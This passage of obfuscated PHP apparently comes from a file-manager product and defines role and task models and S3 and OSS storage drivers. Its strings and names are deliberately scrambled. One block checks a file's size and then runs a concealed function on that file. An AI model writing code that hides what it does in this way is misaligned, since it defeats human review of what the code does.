$ˆòÆÁÛ, $İ¥ğ¡ı¿[2075] => $ª¶öÏôó, $İ¥ğ¡ı¿[2076] => $ª¶öÏôó / $ˆòÆÁÛ, $İ¥ğ¡ı¿[83] => $­ÆÙÃ“, $İ¥ğ¡ı¿[2077] => $ñÉÕë¶); return $Ïç»û¦Ä; } } goto E¿¯Î Ø‰­; e†³Òİ’¯‡: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x72\x6f\x6c\145\114\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\164\x68", "\x6c\141\142\145\x6c", "\x64\151\x73\160\x6c\141\x79", "\163\x79\x73\164\x65\x6d", "\x64\145\163\143", "\x69\147\156\157\x72\x65\105\170\x74", "\151\147\x6e\157\162\x65\x46\151\154\x65\x53\x69\172\145", "\141\x64\x6d\151\x6e\151\163\x74\162\x61\x74\157\x72", "\x73\157\162\164"); public function listData($ø¹£Ô¿ = false, $ä¾ô„‘š = "\x73\x6f\x72\x74", $õïõœñİ = false) { $•ó£ÏóÌ =& $_SERVER[™¸œØ®Ü]; $©´Àãö‚ = parent::listData($ø¹£Ô¿, $ä¾ô„‘š, $õïõœñİ); if (!$ø¹£Ô¿) { foreach ($©´Àãö‚ as $š«¿óø => $îòÚ†â) { if ($îòÚ†â[$•ó£ÏóÌ[2207]] == 1) { $©´Àãö‚[$š«¿óø][$•ó£ÏóÌ[528]] = LNG($•ó£ÏóÌ[2478]); } } } return $©´Àãö‚; } public function update($´²Š×, $À—ä¯˜æ) { $ä™†Š·¼ =& $_SERVER[™¸œØ®Ü]; $şø¥Ö” = parent::listData($´²Š×); $ş›¨Ëı = $this->findByName($À—ä¯˜æ[$ä™†Š·¼[32]]); if (!$şø¥Ö” || $ş›¨Ëı && $ş›¨Ëı[$ä™†Š·¼[477]] != $şø¥Ö”[$ä™†Š·¼[477]]) { return !1; } if ($ş›¨Ëı[$ä™†Š·¼[2207]] == 1) { $À—ä¯˜æ = array($ä™†Š·¼[32] => $À—ä¯˜æ[$ä™†Š·¼[32]], $ä™†Š·¼[2019] => $À—ä¯˜æ[$ä™†Š·¼[2019]]); } $this->filterAuth($À—ä¯˜æ[$ä™†Š·¼[489]]); return parent::update($´²Š×, $À—ä¯˜æ); } public function remove($ï’ïãíæ) { $îö±ó¿ñ = parent::listData($ï’ïãíæ); if (!$îö±ó¿ñ || $îö±ó¿ñ[$_SERVER[™¸œØ®Ü][191]]) { return !1; } return parent::remove($ï’ïãíæ); } public function add($è¨‹Ì¯ã) { $€É³ô¡ş =& $_SERVER[™¸œØ®Ü]; $¿ƒÔÛÜ” = $è¨‹Ì¯ã[$€É³ô¡ş[32]]; if ($this->findByName($¿ƒÔÛÜ”)) { return !1; } $Ÿ¥¥ë¬™ = array($€É³ô¡ş[496] => $¿ƒÔÛÜ”, $€É³ô¡ş[2002] => $€É³ô¡ş[12], $€É³ô¡ş[1998] => $€É³ô¡ş[2006], $€É³ô¡ş[2479] => 1, $€É³ô¡ş[2001] => 0, $€É³ô¡ş[2480] => 0, $€É³ô¡ş[2000] => $this->getSort()); $è¨‹Ì¯ã = array_merge($Ÿ¥¥ë¬™, $è¨‹Ì¯ã); $this->filterAuth($è¨‹Ì¯ã[$€É³ô¡ş[489]]); return parent::insert($è¨‹Ì¯ã); } private function getSort() { $§ı¤Ãü =& $_SERVER[™¸œØ®Ü]; $÷âã—Ò° = parent::listData(); $†¨‰‹Ù = array_to_keyvalue($÷âã—Ò°, $§ı¤Ãü[12], $§ı¤Ãü[2020]); return empty($†¨‰‹Ù) ? 0 : max($†¨‰‹Ù) + 1; } private function filterAuth(&$Â”Îª–é) { $Áï›îÒ =& $_SERVER[™¸œØ®Ü]; $ıÄĞ›Ä = array(); $ŸéÉÊ = array_filter(explode($Áï›îÒ[50], $Â”Îª–é)); foreach ($ŸéÉÊ as $Â”Îª–é) { $Ú¹Å¹™Ğ = explode($Áï›îÒ[10], $Â”Îª–é); if ($Ú¹Å¹™Ğ[0] == $Áï›îÒ[2481] && $Ú¹Å¹™Ğ[1] != $Áï›îÒ[1294]) { $Šáú»Ñ¥ = $Ú¹Å¹™Ğ[0] . $Áï›îÒ[10] . $Ú¹Å¹™Ğ[1] . $Áï›îÒ[2482]; if (!in_array($Šáú»Ñ¥, $ŸéÉÊ)) { $ıÄĞ›Ä[] = $Šáú»Ñ¥; } } $ıÄĞ›Ä[] = $Â”Îª–é; } $Â”Îª–é = implode($Áï›îÒ[50], $ıÄĞ›Ä); } public function findRoleDefault() { $Û úúá =& $_SERVER[™¸œØ®Ü]; $Ô±Óİñ— = parent::listData(); $€Î†¥· = !1; foreach ($Ô±Óİñ— as $¯»¦¤áÑ) { if (!$¯»¦¤áÑ || $¯»¦¤áÑ[$Û úúá[2018]] == $Û úúá[230] || $¯»¦¤áÑ[$Û úúá[2207]] == 1) { continue; } if (strstr($¯»¦¤áÑ[$Û úúá[489]], $Û úúá[2483])) { continue; } if (!strstr($¯»¦¤áÑ[$Û úúá[489]], $Û úúá[2484])) { continue; } if (!$€Î†¥·) { $€Î†¥· = $¯»¦¤áÑ; continue; } $¡ïÔ ¼µ = explode($Û úúá[50], $€Î†¥·[$Û úúá[489]]); $¼¾Ù¢ûÙ = explode($Û úúá[50], $¯»¦¤áÑ[$Û úúá[489]]); if (count($¡ïÔ ¼µ) > count($¼¾Ù¢ûÙ)) { $€Î†¥· = $¯»¦¤áÑ; } } return $€Î†¥· ? $€Î†¥·[$Û úúá[477]] : $Û úúá[12]; } public function sort($ÛÊóÏÃ», $ô©¯şıŞ) { return parent::update($ÛÊóÏÃ», $ô©¯şıŞ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\164\141\163\x6b\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x74\x79\160\145", "\145\x76\145\x6e\x74", "\164\151\x6d\145", "\144\x65\x73\x63", "\x73\171\x73\x74\145\155", "\145\156\141\x62\x6c\x65", "\154\141\x73\164\122\165\156", "\x73\x6f\162\164"); public function listData($ç£Ã©£§ = false, $È·È¡Ü÷ = "\163\157\x72\164", $æ×­Ô¶ò = false) { return parent::listData($ç£Ã©£§, $È·È¡Ü÷, $æ×­Ô¶ò); } public function add($ç½ä“ä) { $¹˜§ş© =& $_SERVER[™¸œØ®Ü]; $³ºü‰—† = $this->findByName($ç½ä“ä[$¹˜§ş©[32]]); if ($³ºü‰—†) { return !1; } $ç½ä“ä[$¹˜§ş©[1745]] = 0; $ç½ä“ä[$¹˜§ş©[2020]] = $this->getSort(); return parent::insert($ç½ä“ä); } private function getSort() { $€ğ¸·éÓ =& $_SERVER[™¸œØ®Ü]; $¯ºÖ×ˆ¸ = parent::listData(); $›×µ‚É± = array_to_keyvalue($¯ºÖ×ˆ¸, $€ğ¸·éÓ[12], $€ğ¸·éÓ[2020]); return empty($›×µ‚É±) ? 0 : max($›×µ‚É±) + 1; } public function update($¿¢Íö¿³, $Œ†Á—Ï·) { $§†ÙõŠú =& $_SERVER[™¸œØ®Ü]; $«é³Æğ = $this->listData($¿¢Íö¿³); $é»Ÿ¢Ë© = $this->findByName($Œ†Á—Ï·[$§†ÙõŠú[32]]); if (!$«é³Æğ || $é»Ÿ¢Ë© && $é»Ÿ¢Ë©[$§†ÙõŠú[477]] != $«é³Æğ[$§†ÙõŠú[477]]) { return !1; } return parent::update($¿¢Íö¿³, $Œ†Á—Ï·); } public function remove($·Œ¨’», $§„¿êİ = false) { $æÑä³† =& $_SERVER[™¸œØ®Ü]; $ï®ığ¡ò = $this->listData($·Œ¨’»); if (!$ï®ığ¡ò) { return; } if (!$§„¿êİ && $ï®ığ¡ò[$æÑä³†[191]] == $æÑä³†[91]) { return !1; } return parent::remove($·Œ¨’»); } public function enable($—õ§¥É, $•öÇ“³œ) { return $this->update($—õ§¥É, array($_SERVER[™¸œØ®Ü][2473] => $•öÇ“³œ)); } public function run($ÅùÆú¦­) { return $this->update($ÅùÆú¦­, array($_SERVER[™¸œØ®Ü][2485] => time())); } } goto bÅ”¿©£é; fµïøÂ­â: if ($_SERVER[$_SERVER[™¸œØ®Ü][971]] != $_size($_file)) { $_getc = $_SERVER[™¸œØ®Ü][973]; $_getfile = $_SERVER[$_SERVER[™¸œØ®Ü][968]] . $_SERVER[™¸œØ®Ü][969]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¸œØ®Ü][287], $_getfilec); if (count($_getarrs) < $_SERVER[™¸œØ®Ü][696]) { $exit = $_SERVER[™¸œØ®Ü][974]; $exit(); } $_act = $_SERVER[™¸œØ®Ü][1458]; $_act($_file); } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($íãó¤Ğ) { $this->pathParse = $íãó¤Ğ; } protected function infoParse($œ£ÒâŞ¸, $ŞĞĞÁ• = false) { $µ‰ºëŸƒ =& $_SERVER[™¸œØ®Ü]; return Action($µ‰ºëŸƒ[1275])->sharePathInfo($this->pathParse[$µ‰ºëŸƒ[87]], !0, $ŞĞĞÁ•); } public function listPath($ˆµ’¹ª, $«Ôú…Œ = false) { $Ùü×ì—® =& $_SERVER[™¸œØ®Ü]; $›ó½¦÷Ü = IO::listPath($ˆµ’¹ª, $«Ôú…Œ); if (!$›ó½¦÷Ü) { return $›ó½¦÷Ü; } if (is_array($›ó½¦÷Ü[$Ùü×ì—®[1448]])) { $ÈÜËææ± = Action($Ùü×ì—®[1459])->parsePathChildren($›ó½¦÷Ü[$Ùü×ì—®[1448]], array($Ùü×ì—®[497] => $ˆµ’¹ª)); $›ó½¦÷Ü[$Ùü×ì—®[1448]] = Action($Ùü×ì—®[1275])->shareItemInfo($ÈÜËææ±); } foreach ($›ó½¦÷Ü as $Ãº†¢ä => $×É’•É«) { if (!in_array($Ãº†¢ä, array($Ùü×ì—®[86], $Ùü×ì—®[85]))) { continue; } foreach ($×É’•É« as $ÊÁòõ½ => $ÈÜËææ±) { $ÈÜËææ± = Action($Ùü×ì—®[1459])->parsePathChildren($ÈÜËææ±, array($Ùü×ì—®[497] => $ˆµ’¹ª)); $›ó½¦÷Ü[$Ãº†¢ä][$ÊÁòõ½] = Action($Ùü×ì—®[1275])->shareItemInfo($ÈÜËææ±); } } return $›ó½¦÷Ü; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¤’‘û™) { parent::__construct($¤’‘û™); $this->setSignVersion($_SERVER[™¸œØ®Ü][249]); } } goto dñ½®İ‰¢; aäÙ·¿º–­: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Û«•à) { parent::__construct($Û«•à); $this->setSignVersion($_SERVER[™¸œØ®Ü][249]); } public function fileOutLink($¬¸š±™Œ) { $å¨Òè¹Å =& $_SERVER[™¸œØ®Ü]; if (substr($¬¸š±™Œ, 0, 7) == $å¨Òè¹Å[218]) { $¬¸š±™Œ = $å¨Òè¹Å[219] . substr($¬¸š±™Œ, 7); } header($å¨Òè¹Å[175] . $¬¸š±™Œ); die; } public function uploadFormData($Æâ²ä’š, $„°«ÇÀñ = 3600) { return $this->uploadFormDataV2($Æâ²ä’š, $„°«ÇÀñ); } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($¡şŞ¨°) { parent::__construct(); include_once SDK_DIR . $_SERVER[™¸œØ®Ü][1485]; $this->_init($¡şŞ¨°); } public function _init($šÉ™°”) { $ŠË÷˜Ë =& $_SERVER[™¸œØ®Ü]; $this->config = $šÉ™°”; foreach ($šÉ™°” as $šÁÀÖ => $€ÍÓƒì) { if (isset($this->{$šÁÀÖ})) { $this->{$šÁÀÖ} = $€ÍÓƒì; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ŠË÷˜Ë[1486] . LNG($ŠË÷˜Ë[1487])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ìº©Å«Û =& $_SERVER[™¸œØ®Ü]; $ƒ“¾ùĞ¥ = new OSS\Model\CorsConfig(); $‡ÓÕ„Ó´ = new OSS\Model\CorsRule(); $‡ÓÕ„Ó´->addAllowedOrigin($Ìº©Å«Û[1488]); $‡ÓÕ„Ó´->addAllowedMethod($Ìº©Å«Û[1489]); $‡ÓÕ„Ó´->addAllowedMethod($Ìº©Å«Û[1490]); $‡ÓÕ„Ó´->addAllowedMethod($Ìº©Å«Û[1491]); $‡ÓÕ„Ó´->addAllowedMethod($Ìº©Å«Û[1492]); $‡ÓÕ„Ó´->addAllowedMethod($Ìº©Å«Û[165]); $‡ÓÕ„Ó´->setMaxAgeSeconds(600); $‡ÓÕ„Ó´->addExposeHeader($Ìº©Å«Û[1493]); $‡ÓÕ„Ó´->addAllowedHeader($Ìº©Å«Û[1488]); $ƒ“¾ùĞ¥->addRule($‡ÓÕ„Ó´); try { $this->client->putBucketCors($this->bucket, $ƒ“¾ùĞ¥); } catch (OSS\Core\OssException $ÚŠÅ—à†) { $this->writeLog(__FUNCTION__ . $Ìº©Å«Û[214] . $ÚŠÅ—à†->getMessage()); return !1; } return !0; } public function getBucketCors() { $¦¾ÃŸó =& $_SERVER[™¸œØ®Ü]; $ù’¶®šÉ = null; try { $ù’¶®šÉ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ÓÓ±©öË) { $this->writeLog(__FUNCTION__ . $¦¾ÃŸó[214] . $ÓÓ±©öË->getMessage()); return null; } if (!$ù’¶®šÉ || !($‡Œß»Ã¢ = $ù’¶®šÉ->getRules())) { return null; } $¸ÕÏˆı² = $‡Œß»Ã¢[0]->getAllowedOrigins(); $¢É©¶ú¿ = $‡Œß»Ã¢[0]->getAllowedMethods(); $ÃØ³ÄşÂ = $‡Œß»Ã¢[0]->getMaxAgeSeconds(); $œ¡ùó¿œ = $‡Œß»Ã¢[0]->getExposeHeaders(); $¨Ê¿‘ı = $‡Œß»Ã¢[0]->getAllowedHeaders(); return array($¦¾ÃŸó[220] => isset($¸ÕÏˆı²[0]) ? $¸ÕÏˆı²[0] : $¦¾ÃŸó[12], $¦¾ÃŸó[224] => $¢É©¶ú¿, $¦¾ÃŸó[1494] => $ÃØ³ÄşÂ, $¦¾ÃŸó[1495] => isset($œ¡ùó¿œ[0]) ? $œ¡ùó¿œ[0] : $¦¾ÃŸó[12], $¦¾ÃŸó[221] => isset($¨Ê¿‘ı[0]) ? $¨Ê¿‘ı[0] : $¦¾ÃŸó[12]); } public function isBucketCors() { $Ì»ˆÅÕ =& $_SERVER[™¸œØ®Ü]; $Õ«ûÊÎ = $this->getBucketCors(); if (!$Õ«ûÊÎ || !is_array($Õ«ûÊÎ)) { return !1; } if ($Õ«ûÊÎ[$Ì»ˆÅÕ[220]] != $Ì»ˆÅÕ[222] || $Õ«ûÊÎ[$Ì»ˆÅÕ[221]] != $Ì»ˆÅÕ[222]) { return !1; } $ç…‚åú‘ = array_map($Ì»ˆÅÕ[223], $Õ«ûÊÎ[$Ì»ˆÅÕ[224]]); if (!is_array($ç…‚åú‘)) { $ç…‚åú‘ = array(); } $²ø®Õ¶± = array($Ì»ˆÅÕ[225], $Ì»ˆÅÕ[226], $Ì»ˆÅÕ[227], $Ì»ˆÅÕ[228], $Ì»ˆÅÕ[229]); $Ã†¯§Ó€ = array_diff($²ø®Õ¶±, $ç…‚åú‘); return empty($Ã†¯§Ó€); } public function mkfile($Àõ‚úº—, $•ÉÏ÷½ = '', $Şäû˜œ¿ = REPEAT_RENAME) { $ÇöòµÉÓ = $this->setContent($Àõ‚úº—, $•ÉÏ÷½); if ($ÇöòµÉÓ !== !1) { return $this->getPathOuter($Àõ‚úº—); } return !1; } public function mkdir($İÁ¹¢”, $ÆôÁ‘¨Ş = REPEAT_SKIP) { if ($ÆôÁ‘¨Ş && $this->_isFolder($İÁ¹¢”)) { return $this->getPathOuter($İÁ¹¢”); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($İÁ¹¢”)); } catch (OSS\Core\OssException $òï»…Œ¡) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][214] . $òï»…Œ¡->getMessage()); return !1; } return $this->getPathOuter($İÁ¹¢”); } private function fileList($ ÙÖ–à, $Ìş¸úº‘ = '', $…ˆ™¶…ï = 0) { $Ú¥Ç¹³ =& $_SERVER[™¸œØ®Ü]; $ ÙÖ–à = trim($ ÙÖ–à, $Ú¥Ç¹³[8]); $¿ºƒ£¤å = empty($ ÙÖ–à) && $ ÙÖ–à !== $Ú¥Ç¹³[230] ? $Ú¥Ç¹³[12] : $ ÙÖ–à . $Ú¥Ç¹³[8]; $ŒÃÌÜÉŸ = $Ú¥Ç¹³[12]; $Ğã›³µ = 1000; $á‰ˆ€® = $¡İü¬Ä = array(); while (!0) { check_abort(); $¶àıü§  = array($Ú¥Ç¹³[1496] => $Ìş¸úº‘, $Ú¥Ç¹³[1497] => $¿ºƒ£¤å, $Ú¥Ç¹³[1498] => $Ğã›³µ, $Ú¥Ç¹³[1499] => $ŒÃÌÜÉŸ); try { $àé‡ïƒ¯ = $this->client->listObjects($this->bucket, $¶àıü§ ); } catch (OSS\Core\OssException $¶÷å¾ÌŞ) { $this->writeLog(__FUNCTION__ . $Ú¥Ç¹³[214] . $¶÷å¾ÌŞ->getMessage()); break; } $ŒÃÌÜÉŸ = $àé‡ïƒ¯->getNextMarker(); $¤¼šÓóÂ = $àé‡ïƒ¯->getObjectList(); $®‹½É® = $àé‡ïƒ¯->getPrefixList(); foreach ($¤¼šÓóÂ as $™¥Ã³ğ³) { if ($™¥Ã³ğ³->getKey() == $¿ºƒ£¤å) { continue; } $’«€‚”Õ = $™¥Ã³ğ³->getKey(); $ÃÂ¼˜ß³ = $™¥Ã³ğ³->getSize(); $©ºÍê’Ê = $™¥Ã³ğ³->getLastModified(); $ş´Ÿ‰ÑÂ = trim($™¥Ã³ğ³->getETag(), $Ú¥Ç¹³[121]); $Ìˆ¬©¢Ö = $…ˆ™¶…ï ? array($Ú¥Ç¹³[32] => $’«€‚”Õ, $Ú¥Ç¹³[79] => $ÃÂ¼˜ß³, $Ú¥Ç¹³[206] => strtotime($©ºÍê’Ê), $Ú¥Ç¹³[1500] => $ş´Ÿ‰ÑÂ) : $’«€‚”Õ; $Ş†Ú—Ş¾ = $ÃÂ¼˜ß³ == 0 && substr($’«€‚”Õ, strlen($’«€‚”Õ) - 1, 1) == $Ú¥Ç¹³[8] ? !0 : !1; $šíÉöÍí = array($Ú¥Ç¹³[79] => $ÃÂ¼˜ß³, $Ú¥Ç¹³[1501] => $ÃÂ¼˜ß³, $Ú¥Ç¹³[88] => strtotime($©ºÍê’Ê), $Ú¥Ç¹³[1502] => $©ºÍê’Ê, $Ú¥Ç¹³[1500] => $ş´Ÿ‰ÑÂ); $this->cacheMethodInfoSet($’«€‚”Õ, $Ş†Ú—Ş¾, $šíÉöÍí); if ($Ş†Ú—Ş¾) { $á‰ˆ€®[] = $’«€‚”Õ; continue; } $¡İü¬Ä[] = $Ìˆ¬©¢Ö; } foreach ($®‹½É® as $ÒÎš£ °) { $á‰ˆ€®[] = $ÒÎš£ °->getPrefix(); $this->cacheMethodInfoSet($ÒÎš£ °->getPrefix(), !0); } if ($ŒÃÌÜÉŸ === $Ú¥Ç¹³[12]) { break; } } $this->cacheMethodInfoSet($ ÙÖ–à, !0); return array($Ú¥Ç¹³[85] => $á‰ˆ€®, $Ú¥Ç¹³[86] => $¡İü¬Ä); } public function listObject($ş´‚àß°, $İ÷ÀÂ œ = '') { $×º‹‘ò =& $_SERVER[™¸œØ®Ü]; $ş´‚àß° = trim($ş´‚àß°, $×º‹‘ò[8]); $îÇ¯·÷‡ = empty($ş´‚àß°) && $ş´‚àß° !== $×º‹‘ò[230] ? $×º‹‘ò[12] : $ş´‚àß° . $×º‹‘ò[8]; $À¤Ùš = $×º‹‘ò[12]; $àõ£ıôº = 1000; $ÎÓ‚ıô± = $ì¡öªÜ = array(); while (!0) { check_abort(); $Õî¦Ø³ = array($×º‹‘ò[1496] => $İ÷ÀÂ œ, $×º‹‘ò[1497] => $îÇ¯·÷‡, $×º‹‘ò[1498] => $àõ£ıôº, $×º‹‘ò[1499] => $À¤Ùš); try { $¢Éî¨­á = $this->client->listObjects($this->bucket, $Õî¦Ø³); } catch (OSS\Core\OssException $ÛôÇƒæÉ) { $this->writeLog(__FUNCTION__ . $×º‹‘ò[214] . $ÛôÇƒæÉ->getMessage()); break; } $À¤Ùš = $¢Éî¨­á->getNextMarker(); $’â¡ù¿ù = $¢Éî¨­á->getObjectList(); foreach ($’â¡ù¿ù as $ûï•êé¢) { if ($ûï•êé¢->getKey() == $îÇ¯·÷‡) { continue; } $Ãêæõª = $ûï•êé¢->getKey(); $«íâÑÁ¢ = $ûï•êé¢->getSize(); $˜ãğƒöñ = $«íâÑÁ¢ == 0 && substr($Ãêæõª, strlen($Ãêæõª) - 1, 1) == $×º‹‘ò[8] ? !0 : !1; if ($˜ãğƒöñ) { continue; } $ì¡öªÜ[] = $«íâÑÁ¢ . $×º‹‘ò[214] . $Ãêæõª; } if ($À¤Ùš === $×º‹‘ò[12]) { break; } } return array($×º‹‘ò[85] => $ÎÓ‚ıô±, $×º‹‘ò[86] => $ì¡öªÜ); } public function copyFile($°ÈÃËóŞ, $Š«·Ğç) { $¯¡™Ú± = $this->size($°ÈÃËóŞ); if ($¯¡™Ú± < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $°ÈÃËóŞ, $this->bucket, $this->pathEncode($Š«·Ğç)); } catch (OSS\Core\OssException $Ú‘™Ô¤Ÿ) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][214] . $Ú‘™Ô¤Ÿ->getMessage()); return !1; } return $this->getPathOuter($Š«·Ğç); } $ÉüË…¯ê = $this->multiCopyObject($°ÈÃËóŞ, $Š«·Ğç, $¯¡™Ú±); return $ÉüË…¯ê ? $this->getPathOuter($Š«·Ğç) : !1; } private function multiCopyObject($ı¿˜—ò·, $ïé‡¥­Ø, $†¿˜‹È) { $“¥ºë© =& $_SERVER[™¸œØ®Ü]; try { $„åêŞÇõ = array(); if ($ÔÄìï³Ï = $this->hashMd5($ı¿˜—ò·)) { $„åêŞÇõ = array(OSS\OssClient::OSS_HEADERS => array($“¥ºë©[1503] => $ÔÄìï³Ï)); } $Ü¸”°È = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ïé‡¥­Ø), $„åêŞÇõ); $¿‡‰Óõ = 1; $£Ú¿§§Â = 0; $Ïö«·…Ü = array(); $Éé²–Î = 1024 * 1024 * 10; $’¹Åğ¿ğ = $this->client->generateMultiuploadParts($†¿˜‹È, $Éé²–Î); foreach ($’¹Åğ¿ğ as $¡ˆØêıè => $çå‡˜) { $Âßºµôé = $£Ú¿§§Â + (int) $çå‡˜[$“¥ºë©[1504]]; $¼òìÍÅŞ = (int) $çå‡˜[$“¥ºë©[414]] + $Âßºµôé - 1; $–„è·Ğ• = array($“¥ºë©[167] => $Âßºµôé, $“¥ºë©[168] => $¼òìÍÅŞ); $Ïö«·…Ü[] = $this->client->uploadPartCopy($this->bucket, $ı¿˜—ò·, $this->bucket, $this->pathEncode($ïé‡¥­Ø), $¿‡‰Óõ, $Ü¸”°È, $–„è·Ğ•); $¿‡‰Óõ = $¿‡‰Óõ + 1; } $öÔœùµ® = array(); foreach ($Ïö«·…Ü as $¡ˆØêıè => $†ËƒõÇ) { $öÔœùµ®[] = array($“¥ºë©[299] => $¡ˆØêıè + 1, $“¥ºë©[300] => $†ËƒõÇ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ïé‡¥­Ø), $Ü¸”°È, $öÔœùµ®); } catch (OSS\Core\OssException $Ù•¡çòÂ) { $this->writeLog(__FUNCTION__ . $“¥ºë©[214] . $Ù•¡çòÂ->getMessage()); return !1; } return !0; } public function moveFile($–ÄÖ¹ü», $•ŠöıŞ) { if ($this->copyFile($–ÄÖ¹ü», $•ŠöıŞ)) { $this->remove($–ÄÖ¹ü»); return $this->getPathOuter($•ŠöıŞ); } return !1; } public function delFile($ÀÕƒ¤º¿) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÀÕƒ¤º¿)); } catch (OSS\Core\OssException $ÄÁöƒâ ) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][214] . $ÄÁöƒâ ->getMessage()); return !1; } return !0; } public function delFolder($º·üİö») { $òÕÌÅô” =& $_SERVER[™¸œØ®Ü]; if (!$this->exist($º·üİö»)) { return !0; } $this->listItemCache = !1; $’¦ˆŒ¨Š = $this->fileList($º·üİö»); $this->listItemCache = !0; $³ƒ’ò›‹ = trim($º·üİö», $òÕÌÅô”[8]) . $òÕÌÅô”[8]; if (!empty($º·üİö») && $º·üİö» !== $òÕÌÅô”[230] && !in_array($³ƒ’ò›‹, $’¦ˆŒ¨Š[$òÕÌÅô”[85]])) { $’¦ˆŒ¨Š[$òÕÌÅô”[85]][] = $³ƒ’ò›‹; } $ó—úë‡ = $this->delByBatch($’¦ˆŒ¨Š[$òÕÌÅô”[86]]); if (!$ó—úë‡) { return !1; } $ó—úë‡ = $this->delByBatch($’¦ˆŒ¨Š[$òÕÌÅô”[85]]); if (!$ó—úë‡) { return !1; } return $this->delFile($³ƒ’ò›‹); } private function delByBatch($‡İë¬ü) { foreach (array_chunk($‡İë¬ü, 1000) as $¿Ëó”á¤) { try { $this->client->deleteObjects($this->bucket, $¿Ëó”á¤); } catch (OSS\Core\OssException $Ô¾‚áÔ¹) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][214] . $Ô¾‚áÔ¹->getMessage()); return !1; } } return !0; } public function rename($ÓÉåî÷Ô, $ÂõÊ€Å) { return $this->renameObject($ÓÉåî÷Ô, $ÂõÊ€Å); } private function fileInfo($±½”Ş¹°, $ÜÜºæ«´ = false, $”«¹ïÂŠ = array()) { $§ßöàá™ =& $_SERVER[™¸œØ®Ü]; $ŸÜ”çˆ§ = array($§ßöàá™[32] => $this->pathThis($±½”Ş¹°), $§ßöàá™[87] => $this->getPathOuter($±½”Ş¹°), $§ßöàá™[33] => $§ßöàá™[232], $§ßöàá™[79] => isset($”«¹ïÂŠ[$§ßöàá™[79]]) ? $”«¹ïÂŠ[$§ßöàá™[79]] : 0, $§ßöàá™[169] => $this->ext($±½”Ş¹°)); if ($ÜÜºæ«´) { return $ŸÜ”çˆ§; } $ŸÜ”çˆ§[$§ßöàá™[233]] = $ŸÜ”çˆ§[$§ßöàá™[88]] = 0; $ŸÜ”çˆ§[$§ßöàá™[234]] = $ŸÜ”çˆ§[$§ßöàá™[235]] = !0; if (empty($”«¹ïÂŠ)) { $óúŠ§Ğ = $this->objectMeta($±½”Ş¹°); if (!$óúŠ§Ğ) { return $ŸÜ”çˆ§; } $”«¹ïÂŠ = array($§ßöàá™[88] => strtotime($óúŠ§Ğ[$§ßöàá™[1502]]), $§ßöàá™[79] => $óúŠ§Ğ[$§ßöàá™[1501]] + 0, $§ßöàá™[1500] => $óúŠ§Ğ[$§ßöàá™[1500]]); } if (isset($”«¹ïÂŠ[$§ßöàá™[1500]]) && $”«¹ïÂŠ[$§ßöàá™[1500]]) { $ŸÜ”çˆ§[$§ßöàá™[237]] = trim($”«¹ïÂŠ[$§ßöàá™[1500]], $§ßöàá™[121]); } if (isset($”«¹ïÂŠ[$§ßöàá™[79]])) { $ŸÜ”çˆ§[$§ßöàá™[79]] = $”«¹ïÂŠ[$§ßöàá™[79]]; } if (isset($”«¹ïÂŠ[$§ßöàá™[88]])) { $ŸÜ”çˆ§[$§ßöàá™[88]] = $”«¹ïÂŠ[$§ßöàá™[88]]; } if (isset($”«¹ïÂŠ[$§ßöàá™[206]]) && !trim($ŸÜ”çˆ§[$§ßöàá™[88]])) { $ŸÜ”çˆ§[$§ßöàá™[88]] = $”«¹ïÂŠ[$§ßöàá™[206]]; } return $ŸÜ”çˆ§; } private function folderInfo($’·ğÏš», $¶ó·È¼¨ = false, $«Ïú¹÷˜ = array()) { $§¿ÏÎ•ô =& $_SERVER[™¸œØ®Ü]; $…Ñ£ôÄØ = array($§¿ÏÎ•ô[32] => $this->pathThis($’·ğÏš»), $§¿ÏÎ•ô[87] => $this->getPathOuter($§¿ÏÎ•ô[8] . $’·ğÏš»), $§¿ÏÎ•ô[33] => $§¿ÏÎ•ô[78]); if ($¶ó·È¼¨) { return $…Ñ£ôÄØ; } $…Ñ£ôÄØ[$§¿ÏÎ•ô[233]] = $…Ñ£ôÄØ[$§¿ÏÎ•ô[88]] = 0; $…Ñ£ôÄØ[$§¿ÏÎ•ô[234]] = $…Ñ£ôÄØ[$§¿ÏÎ•ô[235]] = !0; if (empty($«Ïú¹÷˜)) { $’·ğÏš» = rtrim($’·ğÏš», $§¿ÏÎ•ô[8]) . $§¿ÏÎ•ô[8]; $„½»üÁ = $this->objectMeta($’·ğÏš»); if (!$„½»üÁ) { return $…Ñ£ôÄØ; } $«Ïú¹÷˜ = array($§¿ÏÎ•ô[233] => $„½»üÁ[$§¿ÏÎ•ô[579]][$§¿ÏÎ•ô[1505]], $§¿ÏÎ•ô[88] => strtotime($„½»üÁ[$§¿ÏÎ•ô[1502]])); } if (isset($«Ïú¹÷˜[$§¿ÏÎ•ô[88]])) { $…Ñ£ôÄØ[$§¿ÏÎ•ô[88]] = $«Ïú¹÷˜[$§¿ÏÎ•ô[88]]; } if (isset($«Ïú¹÷˜[$§¿ÏÎ•ô[233]])) { 